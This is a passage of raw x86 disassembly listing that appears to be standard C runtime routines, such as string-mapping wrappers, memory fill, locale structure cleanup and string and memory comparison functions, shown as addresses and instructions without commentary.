  42790a:	test   BYTE PTR [ebp+0xd],0x4
  42790e:	je     0x42793d
  427910:	cmp    DWORD PTR [ebp+0x1c],ebx
  427913:	je     0x4279d1
  427919:	cmp    edi,DWORD PTR [ebp+0x1c]
  42791c:	jg     0x4279d1
  427922:	push   DWORD PTR [ebp+0x1c]
  427925:	push   DWORD PTR [ebp+0x18]
  427928:	push   esi
  427929:	push   DWORD PTR [ebp-0x2c]
  42792c:	push   DWORD PTR [ebp+0xc]
  42792f:	push   DWORD PTR [ebp+0x8]
  427932:	call   DWORD PTR ds:0x42912c
  427938:	jmp    0x4279d1
  42793d:	mov    DWORD PTR [ebp-0x4],0x2
  427944:	lea    eax,[edi+edi*1]
  427947:	add    eax,0x3
  42794a:	and    eax,0xfffffffc
  42794d:	call   0x425480
  427952:	mov    DWORD PTR [ebp-0x18],esp
  427955:	mov    eax,esp
  427957:	mov    DWORD PTR [ebp-0x30],eax
  42795a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42795e:	jmp    0x42797b
  427960:	xor    eax,eax
  427962:	inc    eax
  427963:	ret    
  427964:	mov    esp,DWORD PTR [ebp-0x18]
  427967:	call   0x4288c5
  42796c:	xor    ebx,ebx
  42796e:	mov    DWORD PTR [ebp-0x30],ebx
  427971:	or     DWORD PTR [ebp-0x4],0xffffffff
  427975:	mov    edi,DWORD PTR [ebp-0x1c]
  427978:	mov    esi,DWORD PTR [ebp-0x28]
  42797b:	cmp    DWORD PTR [ebp-0x30],ebx
  42797e:	jne    0x427998
  427980:	lea    eax,[edi+edi*1]
  427983:	push   eax
  427984:	call   0x426152
  427989:	pop    ecx
  42798a:	mov    DWORD PTR [ebp-0x30],eax
  42798d:	cmp    eax,ebx
  42798f:	je     0x4279d1
  427991:	mov    DWORD PTR [ebp-0x24],0x1
  427998:	push   edi
  427999:	push   DWORD PTR [ebp-0x30]
  42799c:	push   esi
  42799d:	push   DWORD PTR [ebp-0x2c]
  4279a0:	push   DWORD PTR [ebp+0xc]
  4279a3:	push   DWORD PTR [ebp+0x8]
  4279a6:	call   DWORD PTR ds:0x42912c
  4279ac:	test   eax,eax
  4279ae:	je     0x4279d1
  4279b0:	push   ebx
  4279b1:	push   ebx
  4279b2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4279b5:	jne    0x4279bb
  4279b7:	push   ebx
  4279b8:	push   ebx
  4279b9:	jmp    0x4279c1
  4279bb:	push   DWORD PTR [ebp+0x1c]
  4279be:	push   DWORD PTR [ebp+0x18]
  4279c1:	push   edi
  4279c2:	push   DWORD PTR [ebp-0x30]
  4279c5:	push   ebx
  4279c6:	push   DWORD PTR [ebp+0x20]
  4279c9:	call   DWORD PTR ds:0x4290bc
  4279cf:	mov    edi,eax
  4279d1:	cmp    DWORD PTR [ebp-0x24],ebx
  4279d4:	je     0x4279df
  4279d6:	push   DWORD PTR [ebp-0x30]
  4279d9:	call   0x42603a
  4279de:	pop    ecx
  4279df:	cmp    DWORD PTR [ebp-0x20],ebx
  4279e2:	je     0x4279ed
  4279e4:	push   DWORD PTR [ebp-0x2c]
  4279e7:	call   0x42603a
  4279ec:	pop    ecx
  4279ed:	mov    eax,edi
  4279ef:	jmp    0x427b4f
  4279f4:	mov    DWORD PTR [ebp-0x34],ebx
  4279f7:	xor    edi,edi
  4279f9:	mov    DWORD PTR [ebp-0x38],ebx
  4279fc:	cmp    DWORD PTR [ebp+0x8],ebx
  4279ff:	jne    0x427a09
  427a01:	mov    eax,ds:0x4638a4
  427a06:	mov    DWORD PTR [ebp+0x8],eax
  427a09:	cmp    DWORD PTR [ebp+0x20],ebx
  427a0c:	jne    0x427a16
  427a0e:	mov    eax,ds:0x4638b4
  427a13:	mov    DWORD PTR [ebp+0x20],eax
  427a16:	push   DWORD PTR [ebp+0x8]
  427a19:	call   0x4286ad
  427a1e:	pop    ecx
  427a1f:	mov    DWORD PTR [ebp-0x3c],eax
  427a22:	cmp    eax,0xffffffff
  427a25:	jne    0x427a2e
  427a27:	xor    eax,eax
  427a29:	jmp    0x427b4f
  427a2e:	cmp    eax,DWORD PTR [ebp+0x20]
  427a31:	je     0x427b25
  427a37:	push   ebx
  427a38:	push   ebx
  427a39:	lea    ecx,[ebp+0x14]
  427a3c:	push   ecx
  427a3d:	push   DWORD PTR [ebp+0x10]
  427a40:	push   eax
  427a41:	push   DWORD PTR [ebp+0x20]
  427a44:	call   0x4286f6
  427a49:	add    esp,0x18
  427a4c:	mov    DWORD PTR [ebp-0x34],eax
  427a4f:	cmp    eax,ebx
  427a51:	je     0x427a27
  427a53:	push   ebx
  427a54:	push   ebx
  427a55:	push   DWORD PTR [ebp+0x14]
  427a58:	push   eax
  427a59:	push   DWORD PTR [ebp+0xc]
  427a5c:	push   DWORD PTR [ebp+0x8]
  427a5f:	call   DWORD PTR ds:0x429124
  427a65:	mov    esi,eax
  427a67:	mov    DWORD PTR [ebp-0x40],esi
  427a6a:	cmp    esi,ebx
  427a6c:	je     0x427b14
  427a72:	mov    DWORD PTR [ebp-0x4],ebx
  427a75:	add    eax,0x3
  427a78:	and    eax,0xfffffffc
  427a7b:	call   0x425480
  427a80:	mov    DWORD PTR [ebp-0x18],esp
  427a83:	mov    edi,esp
  427a85:	mov    DWORD PTR [ebp-0x44],edi
  427a88:	push   esi
  427a89:	push   ebx
  427a8a:	push   edi
  427a8b:	call   0x427d30
  427a90:	add    esp,0xc
  427a93:	jmp    0x427aa5
  427a95:	xor    eax,eax
  427a97:	inc    eax
  427a98:	ret    
  427a99:	mov    esp,DWORD PTR [ebp-0x18]
  427a9c:	call   0x4288c5
  427aa1:	xor    ebx,ebx
  427aa3:	xor    edi,edi
  427aa5:	or     DWORD PTR [ebp-0x4],0xffffffff
  427aa9:	cmp    edi,ebx
  427aab:	jne    0x427ad0
  427aad:	push   DWORD PTR [ebp-0x40]
  427ab0:	call   0x426152
  427ab5:	pop    ecx
  427ab6:	mov    edi,eax
  427ab8:	cmp    edi,ebx
  427aba:	je     0x427aed
  427abc:	push   DWORD PTR [ebp-0x40]
  427abf:	push   ebx
  427ac0:	push   edi
  427ac1:	call   0x427d30
  427ac6:	add    esp,0xc
  427ac9:	mov    DWORD PTR [ebp-0x38],0x1
  427ad0:	push   DWORD PTR [ebp-0x40]
  427ad3:	push   edi
  427ad4:	push   DWORD PTR [ebp+0x14]
  427ad7:	push   DWORD PTR [ebp-0x34]
  427ada:	push   DWORD PTR [ebp+0xc]
  427add:	push   DWORD PTR [ebp+0x8]
  427ae0:	call   DWORD PTR ds:0x429124
  427ae6:	mov    DWORD PTR [ebp-0x40],eax
  427ae9:	cmp    eax,ebx
  427aeb:	jne    0x427af1
  427aed:	xor    esi,esi
  427aef:	jmp    0x427b17
  427af1:	push   DWORD PTR [ebp+0x1c]
  427af4:	push   DWORD PTR [ebp+0x18]
  427af7:	lea    eax,[ebp-0x40]
  427afa:	push   eax
  427afb:	push   edi
  427afc:	push   DWORD PTR [ebp+0x20]
  427aff:	push   DWORD PTR [ebp-0x3c]
  427b02:	call   0x4286f6
  427b07:	add    esp,0x18
  427b0a:	mov    esi,eax
  427b0c:	neg    esi
  427b0e:	sbb    esi,esi
  427b10:	neg    esi
  427b12:	jmp    0x427b17
  427b14:	mov    esi,DWORD PTR [ebp-0x48]
  427b17:	cmp    DWORD PTR [ebp-0x38],ebx
  427b1a:	je     0x427b3f
  427b1c:	push   edi
  427b1d:	call   0x42603a
  427b22:	pop    ecx
  427b23:	jmp    0x427b3f
  427b25:	push   DWORD PTR [ebp+0x1c]
  427b28:	push   DWORD PTR [ebp+0x18]
  427b2b:	push   DWORD PTR [ebp+0x14]
  427b2e:	push   DWORD PTR [ebp+0x10]
  427b31:	push   DWORD PTR [ebp+0xc]
  427b34:	push   DWORD PTR [ebp+0x8]
  427b37:	call   DWORD PTR ds:0x429124
  427b3d:	mov    esi,eax
  427b3f:	cmp    DWORD PTR [ebp-0x34],ebx
  427b42:	je     0x427b4d
  427b44:	push   DWORD PTR [ebp-0x34]
  427b47:	call   0x42603a
  427b4c:	pop    ecx
  427b4d:	mov    eax,esi
  427b4f:	lea    esp,[ebp-0x54]
  427b52:	call   0x42546f
  427b57:	ret    
  427b58:	push   0x1c
  427b5a:	push   0x429ec8
  427b5f:	call   0x425434
  427b64:	xor    esi,esi
  427b66:	cmp    DWORD PTR ds:0x4638c0,esi
  427b6c:	jne    0x427ba3
  427b6e:	lea    eax,[ebp-0x1c]
  427b71:	push   eax
  427b72:	xor    edi,edi
  427b74:	inc    edi
  427b75:	push   edi
  427b76:	push   0x429e9c
  427b7b:	push   edi
  427b7c:	call   DWORD PTR ds:0x429134
  427b82:	test   eax,eax
  427b84:	je     0x427b8e
  427b86:	mov    DWORD PTR ds:0x4638c0,edi
  427b8c:	jmp    0x427ba3
  427b8e:	call   DWORD PTR ds:0x429030
  427b94:	cmp    eax,0x78
  427b97:	jne    0x427ba3
  427b99:	mov    DWORD PTR ds:0x4638c0,0x2
  427ba3:	mov    eax,ds:0x4638c0
  427ba8:	cmp    eax,0x2
  427bab:	je     0x427c9b
  427bb1:	cmp    eax,esi
  427bb3:	je     0x427c9b
  427bb9:	cmp    eax,0x1
  427bbc:	jne    0x427cc1
  427bc2:	mov    DWORD PTR [ebp-0x20],esi
  427bc5:	mov    DWORD PTR [ebp-0x24],esi
  427bc8:	cmp    DWORD PTR [ebp+0x18],esi
  427bcb:	jne    0x427bd5
  427bcd:	mov    eax,ds:0x4638b4
  427bd2:	mov    DWORD PTR [ebp+0x18],eax
  427bd5:	push   esi
  427bd6:	push   esi
  427bd7:	push   DWORD PTR [ebp+0x10]
  427bda:	push   DWORD PTR [ebp+0xc]
  427bdd:	xor    eax,eax
  427bdf:	cmp    DWORD PTR [ebp+0x20],esi
  427be2:	setne  al
  427be5:	lea    eax,[eax*8+0x1]
  427bec:	push   eax
  427bed:	push   DWORD PTR [ebp+0x18]
  427bf0:	call   DWORD PTR ds:0x429128
  427bf6:	mov    edi,eax
  427bf8:	mov    DWORD PTR [ebp-0x28],edi
  427bfb:	test   edi,edi
  427bfd:	je     0x427cc1
  427c03:	and    DWORD PTR [ebp-0x4],0x0
  427c07:	lea    ebx,[edi+edi*1]
  427c0a:	mov    eax,ebx
  427c0c:	add    eax,0x3
  427c0f:	and    eax,0xfffffffc
  427c12:	call   0x425480
  427c17:	mov    DWORD PTR [ebp-0x18],esp
  427c1a:	mov    esi,esp
  427c1c:	mov    DWORD PTR [ebp-0x2c],esi
  427c1f:	push   ebx
  427c20:	push   0x0
  427c22:	push   esi
  427c23:	call   0x427d30
  427c28:	add    esp,0xc
  427c2b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427c2f:	jmp    0x427c46
  427c31:	xor    eax,eax
  427c33:	inc    eax
  427c34:	ret    
  427c35:	mov    esp,DWORD PTR [ebp-0x18]
  427c38:	call   0x4288c5
  427c3d:	xor    esi,esi
  427c3f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427c43:	mov    edi,DWORD PTR [ebp-0x28]
  427c46:	test   esi,esi
  427c48:	jne    0x427c61
  427c4a:	push   edi
  427c4b:	push   0x2
  427c4d:	call   0x426548
  427c52:	pop    ecx
  427c53:	pop    ecx
  427c54:	mov    esi,eax
  427c56:	test   esi,esi
  427c58:	je     0x427cc1
  427c5a:	mov    DWORD PTR [ebp-0x24],0x1
  427c61:	push   edi
  427c62:	push   esi
  427c63:	push   DWORD PTR [ebp+0x10]
  427c66:	push   DWORD PTR [ebp+0xc]
  427c69:	push   0x1
  427c6b:	push   DWORD PTR [ebp+0x18]
  427c6e:	call   DWORD PTR ds:0x429128
  427c74:	test   eax,eax
  427c76:	je     0x427c89
  427c78:	push   DWORD PTR [ebp+0x14]
  427c7b:	push   eax
  427c7c:	push   esi
  427c7d:	push   DWORD PTR [ebp+0x8]
  427c80:	call   DWORD PTR ds:0x429134
  427c86:	mov    DWORD PTR [ebp-0x20],eax
  427c89:	cmp    DWORD PTR [ebp-0x24],0x0
  427c8d:	je     0x427c96
  427c8f:	push   esi
  427c90:	call   0x42603a
  427c95:	pop    ecx
  427c96:	mov    eax,DWORD PTR [ebp-0x20]
  427c99:	jmp    0x427d09
  427c9b:	mov    ebx,DWORD PTR [ebp+0x1c]
  427c9e:	cmp    ebx,esi
  427ca0:	jne    0x427ca8
  427ca2:	mov    ebx,DWORD PTR ds:0x4638a4
  427ca8:	mov    edi,DWORD PTR [ebp+0x18]
  427cab:	test   edi,edi
  427cad:	jne    0x427cb5
  427caf:	mov    edi,DWORD PTR ds:0x4638b4
  427cb5:	push   ebx
  427cb6:	call   0x4286ad
  427cbb:	pop    ecx
  427cbc:	cmp    eax,0xffffffff
  427cbf:	jne    0x427cc5
  427cc1:	xor    eax,eax
  427cc3:	jmp    0x427d09
  427cc5:	cmp    eax,edi
  427cc7:	je     0x427ce7
  427cc9:	push   0x0
  427ccb:	push   0x0
  427ccd:	lea    ecx,[ebp+0x10]
  427cd0:	push   ecx
  427cd1:	push   DWORD PTR [ebp+0xc]
  427cd4:	push   eax
  427cd5:	push   edi
  427cd6:	call   0x4286f6
  427cdb:	add    esp,0x18
  427cde:	mov    esi,eax
  427ce0:	test   esi,esi
  427ce2:	je     0x427cc1
  427ce4:	mov    DWORD PTR [ebp+0xc],esi
  427ce7:	push   DWORD PTR [ebp+0x14]
  427cea:	push   DWORD PTR [ebp+0x10]
  427ced:	push   DWORD PTR [ebp+0xc]
  427cf0:	push   DWORD PTR [ebp+0x8]
  427cf3:	push   ebx
  427cf4:	call   DWORD PTR ds:0x429130
  427cfa:	mov    edi,eax
  427cfc:	test   esi,esi
  427cfe:	je     0x427d07
  427d00:	push   esi
  427d01:	call   0x42603a
  427d06:	pop    ecx
  427d07:	mov    eax,edi
  427d09:	lea    esp,[ebp-0x38]
  427d0c:	call   0x42546f
  427d11:	ret    
  427d12:	mov    eax,ds:0x4638c4
  427d17:	test   eax,eax
  427d19:	je     0x427d2a
  427d1b:	push   DWORD PTR [esp+0x4]
  427d1f:	call   eax
  427d21:	test   eax,eax
  427d23:	pop    ecx
  427d24:	je     0x427d2a
  427d26:	xor    eax,eax
  427d28:	inc    eax
  427d29:	ret    
  427d2a:	xor    eax,eax
  427d2c:	ret    
  427d2d:	int3   
  427d2e:	int3   
  427d2f:	int3   
  427d30:	mov    edx,DWORD PTR [esp+0xc]
  427d34:	mov    ecx,DWORD PTR [esp+0x4]
  427d38:	test   edx,edx
  427d3a:	je     0x427d8b
  427d3c:	xor    eax,eax
  427d3e:	mov    al,BYTE PTR [esp+0x8]
  427d42:	push   edi
  427d43:	mov    edi,ecx
  427d45:	cmp    edx,0x4
  427d48:	jb     0x427d7b
  427d4a:	neg    ecx
  427d4c:	and    ecx,0x3
  427d4f:	je     0x427d5d
  427d51:	sub    edx,ecx
  427d53:	mov    BYTE PTR [edi],al
  427d55:	add    edi,0x1
  427d58:	sub    ecx,0x1
  427d5b:	jne    0x427d53
  427d5d:	mov    ecx,eax
  427d5f:	shl    eax,0x8
  427d62:	add    eax,ecx
  427d64:	mov    ecx,eax
  427d66:	shl    eax,0x10
  427d69:	add    eax,ecx
  427d6b:	mov    ecx,edx
  427d6d:	and    edx,0x3
  427d70:	shr    ecx,0x2
  427d73:	je     0x427d7b
  427d75:	rep stos DWORD PTR es:[edi],eax
  427d77:	test   edx,edx
  427d79:	je     0x427d85
  427d7b:	mov    BYTE PTR [edi],al
  427d7d:	add    edi,0x1
  427d80:	sub    edx,0x1
  427d83:	jne    0x427d7b
  427d85:	mov    eax,DWORD PTR [esp+0x8]
  427d89:	pop    edi
  427d8a:	ret    
  427d8b:	mov    eax,DWORD PTR [esp+0x4]
  427d8f:	ret    
  427d90:	push   esi
  427d91:	mov    esi,DWORD PTR [esp+0x8]
  427d95:	test   esi,esi
  427d97:	je     0x427f1e
  427d9d:	push   DWORD PTR [esi+0x4]
  427da0:	call   0x42603a
  427da5:	push   DWORD PTR [esi+0x8]
  427da8:	call   0x42603a
  427dad:	push   DWORD PTR [esi+0xc]
  427db0:	call   0x42603a
  427db5:	push   DWORD PTR [esi+0x10]
  427db8:	call   0x42603a
  427dbd:	push   DWORD PTR [esi+0x14]
  427dc0:	call   0x42603a
  427dc5:	push   DWORD PTR [esi+0x18]
  427dc8:	call   0x42603a
  427dcd:	push   DWORD PTR [esi]
  427dcf:	call   0x42603a
  427dd4:	push   DWORD PTR [esi+0x20]
  427dd7:	call   0x42603a
  427ddc:	push   DWORD PTR [esi+0x24]
  427ddf:	call   0x42603a
  427de4:	push   DWORD PTR [esi+0x28]
  427de7:	call   0x42603a
  427dec:	push   DWORD PTR [esi+0x2c]
  427def:	call   0x42603a
  427df4:	push   DWORD PTR [esi+0x30]
  427df7:	call   0x42603a
  427dfc:	push   DWORD PTR [esi+0x34]
  427dff:	call   0x42603a
  427e04:	push   DWORD PTR [esi+0x1c]
  427e07:	call   0x42603a
  427e0c:	push   DWORD PTR [esi+0x38]
  427e0f:	call   0x42603a
  427e14:	push   DWORD PTR [esi+0x3c]
  427e17:	call   0x42603a
  427e1c:	add    esp,0x40
  427e1f:	push   DWORD PTR [esi+0x40]
  427e22:	call   0x42603a
  427e27:	push   DWORD PTR [esi+0x44]
  427e2a:	call   0x42603a
  427e2f:	push   DWORD PTR [esi+0x48]
  427e32:	call   0x42603a
  427e37:	push   DWORD PTR [esi+0x4c]
  427e3a:	call   0x42603a
  427e3f:	push   DWORD PTR [esi+0x50]
  427e42:	call   0x42603a
  427e47:	push   DWORD PTR [esi+0x54]
  427e4a:	call   0x42603a
  427e4f:	push   DWORD PTR [esi+0x58]
  427e52:	call   0x42603a
  427e57:	push   DWORD PTR [esi+0x5c]
  427e5a:	call   0x42603a
  427e5f:	push   DWORD PTR [esi+0x60]
  427e62:	call   0x42603a
  427e67:	push   DWORD PTR [esi+0x64]
  427e6a:	call   0x42603a
  427e6f:	push   DWORD PTR [esi+0x68]
  427e72:	call   0x42603a
  427e77:	push   DWORD PTR [esi+0x6c]
  427e7a:	call   0x42603a
  427e7f:	push   DWORD PTR [esi+0x70]
  427e82:	call   0x42603a
  427e87:	push   DWORD PTR [esi+0x74]
  427e8a:	call   0x42603a
  427e8f:	push   DWORD PTR [esi+0x78]
  427e92:	call   0x42603a
  427e97:	push   DWORD PTR [esi+0x7c]
  427e9a:	call   0x42603a
  427e9f:	add    esp,0x40
  427ea2:	push   DWORD PTR [esi+0x80]
  427ea8:	call   0x42603a
  427ead:	push   DWORD PTR [esi+0x84]
  427eb3:	call   0x42603a
  427eb8:	push   DWORD PTR [esi+0x88]
  427ebe:	call   0x42603a
  427ec3:	push   DWORD PTR [esi+0x8c]
  427ec9:	call   0x42603a
  427ece:	push   DWORD PTR [esi+0x90]
  427ed4:	call   0x42603a
  427ed9:	push   DWORD PTR [esi+0x94]
  427edf:	call   0x42603a
  427ee4:	push   DWORD PTR [esi+0x98]
  427eea:	call   0x42603a
  427eef:	push   DWORD PTR [esi+0x9c]
  427ef5:	call   0x42603a
  427efa:	push   DWORD PTR [esi+0xa0]
  427f00:	call   0x42603a
  427f05:	push   DWORD PTR [esi+0xa4]
  427f0b:	call   0x42603a
  427f10:	push   DWORD PTR [esi+0xa8]
  427f16:	call   0x42603a
  427f1b:	add    esp,0x2c
  427f1e:	pop    esi
  427f1f:	ret    
  427f20:	push   esi
  427f21:	mov    esi,DWORD PTR [esp+0x8]
  427f25:	test   esi,esi
  427f27:	je     0x427f7d
  427f29:	mov    eax,DWORD PTR [esi]
  427f2b:	mov    ecx,DWORD PTR ds:0x463434
  427f31:	cmp    eax,DWORD PTR [ecx]
  427f33:	je     0x427f44
  427f35:	cmp    eax,DWORD PTR ds:0x463404
  427f3b:	je     0x427f44
  427f3d:	push   eax
  427f3e:	call   0x42603a
  427f43:	pop    ecx
  427f44:	mov    eax,DWORD PTR [esi+0x4]
  427f47:	mov    ecx,DWORD PTR ds:0x463434
  427f4d:	cmp    eax,DWORD PTR [ecx+0x4]
  427f50:	je     0x427f61
  427f52:	cmp    eax,DWORD PTR ds:0x463408
  427f58:	je     0x427f61
  427f5a:	push   eax
  427f5b:	call   0x42603a
  427f60:	pop    ecx
  427f61:	mov    esi,DWORD PTR [esi+0x8]
  427f64:	mov    eax,ds:0x463434
  427f69:	cmp    esi,DWORD PTR [eax+0x8]
  427f6c:	je     0x427f7d
  427f6e:	cmp    esi,DWORD PTR ds:0x46340c
  427f74:	je     0x427f7d
  427f76:	push   esi
  427f77:	call   0x42603a
  427f7c:	pop    ecx
  427f7d:	pop    esi
  427f7e:	ret    
  427f7f:	push   esi
  427f80:	mov    esi,DWORD PTR [esp+0x8]
  427f84:	test   esi,esi
  427f86:	je     0x428056
  427f8c:	mov    eax,DWORD PTR [esi+0xc]
  427f8f:	mov    ecx,DWORD PTR ds:0x463434
  427f95:	cmp    eax,DWORD PTR [ecx+0xc]
  427f98:	je     0x427fa9
  427f9a:	cmp    eax,DWORD PTR ds:0x463410
  427fa0:	je     0x427fa9
  427fa2:	push   eax
  427fa3:	call   0x42603a
  427fa8:	pop    ecx
  427fa9:	mov    eax,DWORD PTR [esi+0x10]
  427fac:	mov    ecx,DWORD PTR ds:0x463434
  427fb2:	cmp    eax,DWORD PTR [ecx+0x10]
  427fb5:	je     0x427fc6
  427fb7:	cmp    eax,DWORD PTR ds:0x463414
  427fbd:	je     0x427fc6
  427fbf:	push   eax
  427fc0:	call   0x42603a
  427fc5:	pop    ecx
  427fc6:	mov    eax,DWORD PTR [esi+0x14]
  427fc9:	mov    ecx,DWORD PTR ds:0x463434
  427fcf:	cmp    eax,DWORD PTR [ecx+0x14]
  427fd2:	je     0x427fe3
  427fd4:	cmp    eax,DWORD PTR ds:0x463418
  427fda:	je     0x427fe3
  427fdc:	push   eax
  427fdd:	call   0x42603a
  427fe2:	pop    ecx
  427fe3:	mov    eax,DWORD PTR [esi+0x18]
  427fe6:	mov    ecx,DWORD PTR ds:0x463434
  427fec:	cmp    eax,DWORD PTR [ecx+0x18]
  427fef:	je     0x428000
  427ff1:	cmp    eax,DWORD PTR ds:0x46341c
  427ff7:	je     0x428000
  427ff9:	push   eax
  427ffa:	call   0x42603a
  427fff:	pop    ecx
  428000:	mov    eax,DWORD PTR [esi+0x1c]
  428003:	mov    ecx,DWORD PTR ds:0x463434
  428009:	cmp    eax,DWORD PTR [ecx+0x1c]
  42800c:	je     0x42801d
  42800e:	cmp    eax,DWORD PTR ds:0x463420
  428014:	je     0x42801d
  428016:	push   eax
  428017:	call   0x42603a
  42801c:	pop    ecx
  42801d:	mov    eax,DWORD PTR [esi+0x20]
  428020:	mov    ecx,DWORD PTR ds:0x463434
  428026:	cmp    eax,DWORD PTR [ecx+0x20]
  428029:	je     0x42803a
  42802b:	cmp    eax,DWORD PTR ds:0x463424
  428031:	je     0x42803a
  428033:	push   eax
  428034:	call   0x42603a
  428039:	pop    ecx
  42803a:	mov    esi,DWORD PTR [esi+0x24]
  42803d:	mov    eax,ds:0x463434
  428042:	cmp    esi,DWORD PTR [eax+0x24]
  428045:	je     0x428056
  428047:	cmp    esi,DWORD PTR ds:0x463428
  42804d:	je     0x428056
  42804f:	push   esi
  428050:	call   0x42603a
  428055:	pop    ecx
  428056:	pop    esi
  428057:	ret    
  428058:	int3   
  428059:	int3   
  42805a:	int3   
  42805b:	int3   
  42805c:	int3   
  42805d:	int3   
  42805e:	int3   
  42805f:	int3   
  428060:	push   ebp
  428061:	mov    ebp,esp
  428063:	push   esi
  428064:	xor    eax,eax
  428066:	push   eax
  428067:	push   eax
  428068:	push   eax
  428069:	push   eax
  42806a:	push   eax
  42806b:	push   eax
  42806c:	push   eax
  42806d:	push   eax
  42806e:	mov    edx,DWORD PTR [ebp+0xc]
  428071:	lea    ecx,[ecx+0x0]
  428074:	mov    al,BYTE PTR [edx]
  428076:	or     al,al
  428078:	je     0x428083
  42807a:	add    edx,0x1
  42807d:	bts    DWORD PTR [esp],eax
  428081:	jmp    0x428074
  428083:	mov    esi,DWORD PTR [ebp+0x8]
  428086:	or     ecx,0xffffffff
  428089:	lea    ecx,[ecx+0x0]
  42808c:	add    ecx,0x1
  42808f:	mov    al,BYTE PTR [esi]
  428091:	or     al,al
  428093:	je     0x42809e
  428095:	add    esi,0x1
  428098:	bt     DWORD PTR [esp],eax
  42809c:	jae    0x42808c
  42809e:	mov    eax,ecx
  4280a0:	add    esp,0x20
  4280a3:	pop    esi
  4280a4:	leave  
  4280a5:	ret    
  4280a6:	int3   
  4280a7:	int3   
  4280a8:	int3   
  4280a9:	int3   
  4280aa:	int3   
  4280ab:	int3   
  4280ac:	int3   
  4280ad:	int3   
  4280ae:	int3   
  4280af:	int3   
  4280b0:	mov    edx,DWORD PTR [esp+0x4]
  4280b4:	mov    ecx,DWORD PTR [esp+0x8]
  4280b8:	test   edx,0x3
  4280be:	jne    0x4280fc
  4280c0:	mov    eax,DWORD PTR [edx]
  4280c2:	cmp    al,BYTE PTR [ecx]
  4280c4:	jne    0x4280f4
  4280c6:	or     al,al
  4280c8:	je     0x4280f0
  4280ca:	cmp    ah,BYTE PTR [ecx+0x1]
  4280cd:	jne    0x4280f4
  4280cf:	or     ah,ah
  4280d1:	je     0x4280f0
  4280d3:	shr    eax,0x10
  4280d6:	cmp    al,BYTE PTR [ecx+0x2]
  4280d9:	jne    0x4280f4
  4280db:	or     al,al
  4280dd:	je     0x4280f0
  4280df:	cmp    ah,BYTE PTR [ecx+0x3]
  4280e2:	jne    0x4280f4
  4280e4:	add    ecx,0x4
  4280e7:	add    edx,0x4
  4280ea:	or     ah,ah
  4280ec:	jne    0x4280c0
  4280ee:	mov    edi,edi
  4280f0:	xor    eax,eax
  4280f2:	ret    
  4280f3:	nop
  4280f4:	sbb    eax,eax
  4280f6:	shl    eax,1
  4280f8:	add    eax,0x1
  4280fb:	ret    
  4280fc:	test   edx,0x1
  428102:	je     0x42811c
  428104:	mov    al,BYTE PTR [edx]
  428106:	add    edx,0x1
  428109:	cmp    al,BYTE PTR [ecx]
  42810b:	jne    0x4280f4
  42810d:	add    ecx,0x1
  428110:	or     al,al
  428112:	je     0x4280f0
  428114:	test   edx,0x2
  42811a:	je     0x4280c0
  42811c:	mov    ax,WORD PTR [edx]
  42811f:	add    edx,0x2
  428122:	cmp    al,BYTE PTR [ecx]
  428124:	jne    0x4280f4
  428126:	or     al,al
  428128:	je     0x4280f0
  42812a:	cmp    ah,BYTE PTR [ecx+0x1]
  42812d:	jne    0x4280f4
  42812f:	or     ah,ah
  428131:	je     0x4280f0
  428133:	add    ecx,0x2
  428136:	jmp    0x4280c0
  428138:	int3   
  428139:	int3   
  42813a:	int3   
  42813b:	int3   
  42813c:	int3   
  42813d:	int3   
  42813e:	int3   
  42813f:	int3   
  428140:	mov    eax,DWORD PTR [esp+0xc]
  428144:	test   eax,eax
  428146:	je     0x428192
  428148:	mov    edx,DWORD PTR [esp+0x4]
  42814c:	push   esi
  42814d:	push   edi
  42814e:	mov    esi,edx
  428150:	mov    edi,DWORD PTR [esp+0x10]
  428154:	or     edx,edi
  428156:	and    edx,0x3
  428159:	je     0x428193
  42815b:	test   eax,0x1
  428160:	je     0x428173
  428162:	mov    cl,BYTE PTR [esi]
  428164:	cmp    cl,BYTE PTR [edi]
  428166:	jne    0x4281c0
  428168:	add    esi,0x1
  42816b:	add    edi,0x1
  42816e:	sub    eax,0x1
  428171:	je     0x428190
  428173:	mov    cl,BYTE PTR [esi]
  428175:	mov    dl,BYTE PTR [edi]
  428177:	cmp    cl,dl
  428179:	jne    0x4281c0
  42817b:	mov    cl,BYTE PTR [esi+0x1]
  42817e:	mov    dl,BYTE PTR [edi+0x1]
  428181:	cmp    cl,dl
  428183:	jne    0x4281c0
  428185:	add    edi,0x2
  428188:	add    esi,0x2
  42818b:	sub    eax,0x2
  42818e:	jne    0x428173
  428190:	pop    edi
  428191:	pop    esi
  428192:	ret    
  428193:	mov    ecx,eax
  428195:	and    eax,0x3
  428198:	shr    ecx,0x2
  42819b:	je     0x4281c8
  42819d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42819f:	je     0x4281c8
  4281a1:	mov    ecx,DWORD PTR [esi-0x4]
  4281a4:	mov    edx,DWORD PTR [edi-0x4]
  4281a7:	cmp    cl,dl
  4281a9:	jne    0x4281bb
  4281ab:	cmp    ch,dh
  4281ad:	jne    0x4281bb
  4281af:	shr    ecx,0x10
  4281b2:	shr    edx,0x10
  4281b5:	cmp    cl,dl
  4281b7:	jne    0x4281bb
  4281b9:	cmp    ch,dh
  4281bb:	mov    eax,0x0
  4281c0:	sbb    eax,eax
  4281c2:	pop    edi
  4281c3:	sbb    eax,0xffffffff
  4281c6:	pop    esi
  4281c7:	ret    
  4281c8:	test   eax,eax
  4281ca:	je     0x428190
  4281cc:	mov    edx,DWORD PTR [esi]
  4281ce:	mov    ecx,DWORD PTR [edi]
  4281d0:	cmp    dl,cl
  4281d2:	jne    0x4281bb
  4281d4:	sub    eax,0x1
  4281d7:	je     0x4281f5
  4281d9:	cmp    dh,ch
  4281db:	jne    0x4281bb
  4281dd:	sub    eax,0x1
  4281e0:	je     0x4281f5
  4281e2:	and    ecx,0xff0000
  4281e8:	and    edx,0xff0000
  4281ee:	cmp    edx,ecx
  4281f0:	jne    0x4281bb
  4281f2:	sub    eax,0x1
  4281f5:	pop    edi
  4281f6:	pop    esi
  4281f7:	ret    
  4281f8:	int3   
  4281f9:	int3   
  4281fa:	int3   
  4281fb:	int3   
  4281fc:	int3   
  4281fd:	int3   
  4281fe:	int3   
  4281ff:	int3   
  428200:	push   ebp
  428201:	mov    ebp,esp
  428203:	push   edi
  428204:	push   esi
  428205:	push   ebx
  428206:	mov    ecx,DWORD PTR [ebp+0x10]
  428209:	jecxz  0x428232
